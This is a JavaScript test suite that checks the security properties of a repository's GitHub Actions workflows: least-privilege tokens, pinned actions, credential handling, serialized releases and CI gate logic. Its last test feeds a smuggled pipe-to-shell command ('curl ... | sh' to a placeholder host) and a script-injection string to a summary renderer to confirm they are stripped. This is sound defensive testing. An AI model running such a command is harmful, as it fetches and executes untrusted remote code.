import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { fileURLToPath } from "node:url"
import test from "node:test"
import { parse } from "yaml"
import { renderSummary } from "../../../.github/actions/summary/summary.mjs"

const repository = fileURLToPath(new URL("../../../", import.meta.url))
const read = (path) => parse(readFileSync(join(repository, path), "utf8"))
const workflows = Object.fromEntries(
    readdirSync(join(repository, ".github/workflows"))
        .filter((name) => name.endsWith(".yml"))
        .map((name) => [name, read(`.github/workflows/${name}`)]),
)
const actions = Object.fromEntries(
    readdirSync(join(repository, ".github/actions")).map((name) => [name, read(`.github/actions/${name}/action.yml`)]),
)

// The only jobs allowed to hold write scopes, and exactly which scopes they hold
const writers = {
    "dependabot-changeset.yml/note": { contents: "write", actions: "write" },
    "ci.yml/release-trigger": { actions: "write" },
    "release-version.yml/pull_request": { contents: "write", "pull-requests": "write", actions: "write" },
    "release-publish.yml/publish": { "id-token": "write" },
}

// A static group queues every run behind the previous one, and a queued run is never cancelled
function assertSerialized(concurrency, where) {
    assert.equal(typeof concurrency?.group, "string", where)
    assert.notEqual(concurrency.group.trim(), "", where)
    assert.doesNotMatch(concurrency.group, /\$\{\{/, `${where} must share one group across runs`)
    assert.equal(concurrency["cancel-in-progress"], false, where)
    assert.equal(concurrency.queue, "max", where)
}

// Windows shells often lack bash on PATH. Git for Windows ships it in bin/ under its install root, which sits three
// levels above the directory reported by `git --exec-path`, wherever Git is installed
function windowsGitBash() {
    const execPath = spawnSync("git", ["--exec-path"], { encoding: "utf8", windowsHide: true }).stdout?.trim()
    const candidate = execPath ? join(execPath, "../../../bin/bash.exe") : ""
    return candidate && existsSync(candidate) ? candidate : "bash"
}
const bash = process.platform === "win32" ? windowsGitBash() : "bash"

function* jobs() {
    for (const [file, workflow] of Object.entries(workflows))
        for (const [id, job] of Object.entries(workflow.jobs)) yield { file, workflow, id, job }
}

function* steps() {
    for (const { file, id, job } of jobs()) for (const step of job.steps ?? []) yield { where: `${file}/${id}`, step }
    for (const [name, action] of Object.entries(actions))
        for (const step of action.runs.steps ?? []) yield { where: `actions/${name}`, step }
}

test("Workflows default to read-only tokens and grant writes only to the reviewed jobs", () => {
    for (const [file, workflow] of Object.entries(workflows)) {
        assert.ok(workflow.permissions, `${file} must declare top-level permissions`)
        for (const [scope, level] of Object.entries(workflow.permissions))
            assert.equal(level, "read", `${file} grants ${scope}: ${level} to every job`)
    }
    for (const { file, id, job } of jobs()) {
        const granted = Object.fromEntries(
            Object.entries(job.permissions ?? {}).filter(([, level]) => level === "write"),
        )
        assert.deepEqual(granted, writers[`${file}/${id}`] ?? {}, `${file}/${id} write permissions`)
    }
})

test("OIDC publication is confined to the protected environment after inspection", () => {
    const publish = workflows["release-publish.yml"].jobs.publish
    assert.equal(publish.environment, "package")
    assert.equal(publish.needs, "inspect")
    assertSerialized(publish.concurrency, "release-publish.yml/publish")
    const setup = publish.steps.find((step) => step.id === "setup")
    assert.equal(setup.with.install, false, "The publisher must not install the workspace")
})

test("Release tooling runs from the workflow commit and the release App token stays in one step", () => {
    const publish = workflows["release-publish.yml"]
    for (const [id, job] of Object.entries(publish.jobs))
        for (const step of job.steps ?? [])
            if (String(step.uses).startsWith("actions/checkout@"))
                assert.equal(step.with?.ref, undefined, `release-publish.yml/${id} must check out the workflow commit`)
    const source = readFileSync(join(repository, ".github/workflows/release-publish.yml"), "utf8")
    assert.equal(source.match(/secrets\.RELEASE_APP_PRIVATE_KEY/g)?.length, 1)
    assert.equal(source.match(/steps\.release_token\.outputs\.token/g)?.length, 1)
    const reconcile = publish.jobs.reconcile
    const ids = reconcile.steps.map((step) => step.id)
    const token = reconcile.steps.find((step) => step.id === "release_token")
    assert.match(token.uses, /^actions\/create-github-app-token@[a-f0-9]{40}$/)
    assert.equal(token.with["permission-contents"], "write")
    assert.equal(Object.keys(token.with).filter((key) => key.startsWith("permission-")).length, 1)
    assert.equal(token.with["skip-token-revoke"], undefined)
    assert.ok(ids.indexOf("verify") < ids.indexOf("release_token"), "npm bytes are verified before the token exists")
    const announce = reconcile.steps.find((step) => step.id === "announce")
    assert.equal(announce.env.GH_TOKEN, "${{ steps.release_token.outputs.token }}")
    assert.equal(reconcile.environment, "package")
    assert.deepEqual(reconcile.needs, ["inspect", "publish", "smoke"])
})

test("Every external action and container is pinned to an immutable digest", () => {
    for (const { where, step } of steps()) {
        if (!step.uses) continue
        if (step.uses.startsWith("$/")) continue
        if (step.uses.startsWith("docker://")) assert.match(step.uses, /@sha256:[a-f0-9]{64}$/, where)
        else assert.match(step.uses, /^[\w.-]+\/[\w./-]+@[a-f0-9]{40}$/, `${where}: ${step.uses}`)
    }
    for (const { file, id, job } of jobs())
        if (job.uses) assert.match(job.uses, /^\$\//, `${file}/${id} calls only same-repository workflows`)
})

test("Checkouts drop credentials, scripts avoid expression interpolation and privileged triggers are confined", () => {
    for (const { where, step } of steps()) {
        if (String(step.uses).startsWith("actions/checkout@"))
            assert.equal(step.with?.["persist-credentials"], false, `${where} must not persist checkout credentials`)
        if (step.run) assert.doesNotMatch(step.run, /\$\{\{/, `${where} must pass values through env`)
    }
    for (const [file, workflow] of Object.entries(workflows)) {
        for (const trigger of ["pull_request_target", "workflow_run"].filter((trigger) =>
            file !== "dependabot-changeset.yml" || trigger !== "workflow_run"))
            assert.equal(workflow.on[trigger], undefined, `${file} must not use ${trigger}`)
        for (const [id, job] of Object.entries(workflow.jobs))
            if (`${file}/${id}` !== "release-publish.yml/docs-preview")
                assert.notEqual(job.secrets, "inherit", `${file}/${id} inherits secrets`)
    }
    // A called workflow receives no website environment secret unless its caller inherits secrets
    assert.equal(workflows["release-publish.yml"].jobs["docs-preview"].secrets, "inherit")
})

test("Dependency notes execute only reviewed base code and treat the PR branch as metadata", () => {
    const workflow = workflows["dependabot-changeset.yml"]
    assert.equal(workflow["cache-mode"], "none")
    assert.deepEqual(workflow.on.workflow_run.workflows, ["Check"])
    assert.deepEqual(workflow.on.workflow_run.types, ["completed"])
    const job = workflow.jobs.note
    assert.match(job.if, /event == 'pull_request'/)
    assert.match(job.if, /conclusion == 'success'/)
    assert.match(job.if, /head_repository\.full_name == github\.repository/)
    assert.match(job.if, /sdk-runtime-/)
    const checkout = job.steps.find((step) => String(step.uses).startsWith("actions/checkout@"))
    assert.equal(checkout.with.ref, "${{ github.sha }}")
    const setup = job.steps.find((step) => String(step.uses).startsWith("pnpm/setup@"))
    assert.equal(setup.with.install, false)
    assert.equal(setup.with.cache, false)
    assert.deepEqual(job.steps.filter((step) => step.run).map((step) => step.run), ["node release/dependency-changeset.js"])
    assert.equal(job.steps.at(-1).env.DEPENDENCY_CHECK_RUN_ID, "${{ github.event.workflow_run.id }}")
    assert.equal(workflow.concurrency["cancel-in-progress"], false)
})

test("Release and Preview work is serialized with read-only caches and never cancelled mid-run", () => {
    for (const file of ["release-prepare.yml", "release-version.yml", "release-publish.yml", "docs-preview.yml"])
        assert.equal(workflows[file]["cache-mode"], "read", `${file} cache access`)
    for (const file of ["release-prepare.yml", "release-version.yml", "docs-preview.yml"])
        assert.equal(workflows[file].concurrency["cancel-in-progress"], false, file)
    assertSerialized(workflows["release-publish.yml"].jobs.reconcile.concurrency, "release-publish.yml/reconcile")
    // Manual CI dispatches are never cancelled by a later run
    assert.match(workflows["ci.yml"].concurrency["cancel-in-progress"], /github\.event_name\s*!=\s*'workflow_dispatch'/)
})

test("The required CI gate needs every job and rejects failed, cancelled, skipped and missing results", () => {
    const check = workflows["ci.yml"].jobs.check
    const gated = Object.keys(workflows["ci.yml"].jobs).filter((id) => !["check", "release-trigger"].includes(id))
    assert.deepEqual([...check.needs].sort(), gated.sort())
    assert.equal(check.if, "always()")
    const groups = Object.keys(check.steps[0].env).filter((key) => key.endsWith("_RESULT") && key !== "REUSE_RESULT")
    assert.equal(groups.length, gated.length - 1, "Every check job result reaches the gate")
    // Check jobs skip only for a reused result, and a failed lookup still runs them
    for (const id of gated.filter((id) => id !== "reuse")) {
        const job = workflows["ci.yml"].jobs[id]
        assert.equal(job.needs, "reuse", id)
        assert.match(job.if, /^\$\{\{ !cancelled\(\) && needs\.reuse\.outputs\.reused != 'true' \}\}$/, id)
    }
    // Those skipped jobs make the implicit success() condition false, so the release trigger reads check's own result
    assert.match(workflows["ci.yml"].jobs["release-trigger"].if, /^\$\{\{ !cancelled\(\) && needs\.check\.result == 'success' && /)
    const passed = { ...Object.fromEntries(groups.map((key) => [key, "success"])), REUSE_RESULT: "success", REUSED_RUN_URL: "" }
    const skipped = Object.fromEntries(groups.map((key) => [key, "skipped"]))
    const reused = { REUSE_RESULT: "success", REUSED_RUN_URL: "https://github.com/owner/repo/actions/runs/1" }
    // [results, expected exit status]
    const cases = [
        [passed, 0],
        // A failed reuse lookup is harmless once the full check jobs passed
        [{ ...passed, REUSE_RESULT: "failure" }, 0],
        [{ ...skipped, ...reused }, 0],
        [{ ...skipped, ...reused, REUSE_RESULT: "failure" }, 1],
        [{ ...skipped, REUSE_RESULT: "success", REUSED_RUN_URL: "" }, 1],
    ]
    for (const key of groups)
        for (const result of ["failure", "cancelled", "skipped", ""]) cases.push([{ ...passed, [key]: result }, 1])
    const root = realpathSync(tmpdir())
    const directory = mkdtempSync(join(root, "fluxerly-gate-"))
    try {
        for (const [index, [results, expected]] of cases.entries()) {
            const summary = join(directory, `gate-${index}.md`)
            const result = spawnSync(bash, ["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", check.steps[0].run], {
                cwd: directory,
                encoding: "utf8",
                timeout: 10_000,
                windowsHide: true,
                env: { ...process.env, ...results, GITHUB_STEP_SUMMARY: summary },
            })
            assert.ifError(result.error)
            assert.equal(result.status, expected, `case ${index}: ${result.stderr}`)
        }
    } finally {
        rmSync(directory, { recursive: true, force: true })
    }
})

test("Upstream drift runs daily with serialized read-only observations and retains failed comparisons", () => {
    const workflow = workflows["upstream-drift.yml"]
    const [minute, hour, day, month, weekday] = workflow.on.schedule[0].cron.split(" ")
    assert.deepEqual([day, month, weekday], ["*", "*", "*"])
    assert.ok(Number(minute) > 0 && Number(minute) < 60 && Number(minute) !== 30)
    assert.ok(Number(hour) >= 0 && Number(hour) < 24)
    assert.ok(Object.hasOwn(workflow.on, "workflow_dispatch"))
    assert.deepEqual(workflow.permissions, { contents: "read", actions: "read" })
    assertSerialized(workflow.concurrency, "upstream-drift.yml")
    const job = workflow.jobs.drift
    const restore = job.steps.find((step) => step.id === "baseline")
    const compare = job.steps.find((step) => step.id === "drift")
    const upload = job.steps.find((step) => String(step.uses).startsWith("actions/upload-artifact@"))
    assert.equal(restore.shell, "bash")
    assert.equal(restore.env.GH_TOKEN, "${{ github.token }}")
    assert.equal(compare.shell, "bash")
    assert.equal(compare["working-directory"], "projects")
    assert.equal(compare.env.GITHUB_TOKEN, "${{ github.token }}")
    assert.equal(upload.if, "always()", "A drift failure must not prevent the observation upload")
    assert.equal(upload.with.name, "upstream-baseline")
    assert.equal(upload.with["retention-days"], 90)
    assert.equal(upload.with["if-no-files-found"], "error")
    assert.equal(upload.with.overwrite, true, "A rerun renews its observation instead of leaving stale bytes")
    const existingUpload = workflows["release-prepare.yml"].jobs.prepare.steps.find((step) => String(step.uses).startsWith("actions/upload-artifact@"))
    assert.equal(upload.uses, existingUpload.uses)
    assert.ok(job.steps.indexOf(restore) < job.steps.indexOf(compare))
    assert.ok(job.steps.indexOf(compare) < job.steps.indexOf(upload))
})

test("Upstream artifact restoration selects this workflow's newest earlier run and reports every retrieval fallback", () => {
    const restore = workflows["upstream-drift.yml"].jobs.drift.steps.find((step) => step.id === "baseline")
    const directory = mkdtempSync(join(realpathSync(tmpdir()), "fluxerly-artifacts-"))
    const fakeGh = `
      gh() {
        if [[ "$1" == "api" && "$2" == "--paginate" ]]; then
          [[ "$3" == "repos/owner/repo/actions/artifacts?name=upstream-baseline&per_page=100" && "$4" == "--jq" ]] || return 1
          case "$SCENARIO" in
            lookup-failure) return 1 ;;
            no-artifact) return 0 ;;
            invalid-run) printf '2026-10-03T00:00:00Z\\t100\\tnull\\n' ;;
            *) printf '2026-10-01T00:00:00Z\\t90\\t9\\n2026-10-03T00:00:00Z\\t300\\t30\\n2026-10-02T00:00:00Z\\t200\\t10\\n2026-10-03T00:00:00Z\\t250\\t20\\n' ;;
          esac
        elif [[ "$1" == "api" ]]; then
          case "\${2##*/}" in
            20) printf '.github/workflows/other.yml\\n' ;;
            10)
              case "$SCENARIO" in
                verification-failure) return 1 ;;
                missing-path) printf 'null\\n' ;;
                *) printf '.github/workflows/upstream-drift.yml\\n' ;;
              esac ;;
            *) return 1 ;;
          esac
        elif [[ "$1" == "run" && "$2" == "download" ]]; then
          [[ "$3" == "10" && "$4" == "--repo" && "$5" == "owner/repo" && "$6" == "--name" && "$7" == "upstream-baseline" && "$8" == "--dir" ]] || return 1
          if [[ "$SCENARIO" != "missing-file" ]]; then printf '{}\\n' > "$9/baseline.json"; fi
          [[ "$SCENARIO" != "download-failure" ]]
        else return 1
        fi
      }
    `
    try {
        for (const scenario of ["available", "lookup-failure", "no-artifact", "invalid-run", "verification-failure", "missing-path", "download-failure", "missing-file"]) {
            const temporary = join(directory, scenario)
            const summary = join(directory, `${scenario}.md`)
            const result = spawnSync(bash, ["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", fakeGh + restore.run], {
                cwd: directory,
                encoding: "utf8",
                timeout: 10_000,
                windowsHide: true,
                env: {
                    ...process.env,
                    SCENARIO: scenario,
                    RUNNER_TEMP: temporary,
                    GITHUB_REPOSITORY: "owner/repo",
                    GITHUB_RUN_ID: "30",
                    GITHUB_STEP_SUMMARY: summary,
                },
            })
            assert.ifError(result.error)
            assert.equal(result.status, 0, `${scenario}: ${result.stderr}`)
            assert.equal(existsSync(join(temporary, "upstream-previous/baseline.json")), scenario === "available", scenario)
            assert.equal(existsSync(join(temporary, "upstream-current")), true, "The record directory exists before comparison")
            if (scenario !== "available") {
                assert.ok(readFileSync(summary, "utf8").trim().length > 0, `${scenario} has a visible fallback reason`)
                assert.match(readFileSync(summary, "utf8"), /repository pin/i)
            }
        }
    } finally {
        rmSync(directory, { recursive: true, force: true })
    }
})

test("Upstream comparison passes distinct baseline and record paths to the CLI without shell splitting", () => {
    const compare = workflows["upstream-drift.yml"].jobs.drift.steps.find((step) => step.id === "drift")
    const upload = workflows["upstream-drift.yml"].jobs.drift.steps.find((step) => String(step.uses).startsWith("actions/upload-artifact@"))
    const directory = mkdtempSync(join(realpathSync(tmpdir()), "fluxerly-drift args-"))
    const record = upload.with.path.replace("${{ runner.temp }}", directory)
    try {
        const result = spawnSync(bash, ["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", 'node() { printf "%s\\n" "$@"; }\n' + compare.run], {
            cwd: directory,
            encoding: "utf8",
            timeout: 10_000,
            windowsHide: true,
            env: { ...process.env, RUNNER_TEMP: directory },
        })
        assert.ifError(result.error)
        assert.equal(result.status, 0, result.stderr)
        assert.deepEqual(result.stdout.trim().split(/\r?\n/), [
            "release/upstream.js", "--baseline", `${directory}/upstream-previous/baseline.json`, "--record", record,
        ])
    } finally {
        rmSync(directory, { recursive: true, force: true })
    }
})

test("Setup runs projects/.node-version or the Node floor declared by the SDK manifest", () => {
    const sdk = JSON.parse(readFileSync(join(repository, "projects/sdk/package.json"), "utf8"))
    const floor = `node@${sdk.engines.node.replace(/^>=/, "")}`
    const floorJobs = []
    for (const { file, id, job } of jobs())
        for (const step of job.steps ?? []) {
            if (!String(step.uses).startsWith("pnpm/setup@")) continue
            const where = `${file}/${id}`
            // pnpm/setup reads .node-version from its working directory when no runtime is given
            assert.equal(step.with?.["working-directory"], "projects", `${where} setup directory`)
            const runtimes =
                step.with.runtime === "${{ matrix.runtime }}"
                    ? job.strategy.matrix.include.map((entry) => entry.runtime)
                    : [step.with.runtime]
            for (const runtime of runtimes) if (runtime !== undefined) assert.equal(runtime, floor, where)
            if (runtimes.includes(floor)) floorJobs.push(where)
        }
    // A floor bump that misses one of these copies fails here rather than testing an old Node
    assert.deepEqual(floorJobs.sort(), ["ci.yml/consumers", "release-prepare.yml/prepare", "release-publish.yml/smoke"])
})

test("Job summaries escape untrusted values and never present failures or commands as success", () => {
    const summary = renderSummary({
        title: "Version",
        steps: { version: { outcome: "success", outputs: { token: "test-private-sentinel" } } },
        details: { Version: "<script>bad</script>\n| injected | `code` [link](https://example.invalid)" },
        command: "gh workflow run release-publish.yml -f candidate_checksum=abc",
    })
    assert.doesNotMatch(summary, /<script>|\n\| injected|`code`|\[link\]|test-private-sentinel/)
    assert.match(summary, /```sh\ngh workflow run release-publish\.yml -f candidate_checksum=abc\n```/)
    // The status line directly follows the title, and step outcomes otherwise appear only as table rows
    const status = (rendered) => rendered.split("\n").slice(1).find((line) => line.trim() !== "")
    const guidance = (rendered, step) => rendered.split("\n").filter((line) => !line.startsWith("|") && line.includes(step))
    const input = (outcome) => ({
        title: "Version",
        steps: { setup: { outcome: "success" }, compile: { outcome }, pull: { outcome: "skipped" } },
        next: "Merge the PR",
        command: "gh workflow run release-publish.yml",
    })
    const succeeded = renderSummary({ ...input("success"), steps: { setup: { outcome: "success" }, compile: { outcome: "success" } } })
    assert.match(succeeded, /Merge the PR/)
    assert.match(succeeded, /gh workflow run release-publish\.yml/)
    assert.deepEqual(guidance(succeeded, "compile"), [])
    for (const outcome of ["failure", "cancelled"]) {
        const failed = renderSummary(input(outcome))
        assert.notEqual(status(failed), status(succeeded), outcome)
        assert.notEqual(status(failed), status(renderSummary(input("success"))), `${outcome} is not a skip`)
        assert.notDeepEqual(guidance(failed, "compile"), [], `${outcome} guidance names the failed step`)
        assert.doesNotMatch(failed, /Merge the PR|gh workflow run/, outcome)
    }
    const unsafe = renderSummary({ title: "Prepare", steps: {}, command: "gh run; curl https://example.invalid | sh" })
    assert.doesNotMatch(unsafe, /curl/)
})
